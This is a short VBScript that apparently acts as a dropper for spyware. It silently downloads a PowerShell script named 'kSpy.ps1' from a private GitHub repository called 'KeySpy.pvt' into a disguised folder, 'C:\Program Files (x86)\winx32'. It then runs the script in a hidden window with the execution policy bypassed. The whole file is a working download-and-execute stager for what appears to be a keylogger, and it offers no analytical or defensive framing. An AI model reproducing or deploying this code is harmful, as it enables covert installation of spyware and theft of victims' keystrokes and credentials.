Set objShell = CreateObject("WScript.Shell")

' Define the destination folder where the PowerShell script will be downloaded
destinationFolder = "C:\Program Files (x86)\winx32"

' Define the URL of the PowerShell script
scriptUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy.pvt/main/scripts/kSpy.ps1?token=GHSAT0AAAAAACO7O45HXNQD6U5BGXORCX26ZROXRMQ"

' Download the PowerShell script silently
objShell.Run "cmd /c powershell.exe -ExecutionPolicy Bypass -Command ""(New-Object System.Net.WebClient).DownloadFile('" & scriptUrl & "', '" & destinationFolder & "\kSpy.ps1')""", 0, True

' Execute the PowerShell script silently
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & destinationFolder & "\kSpy.ps1""", 0, True
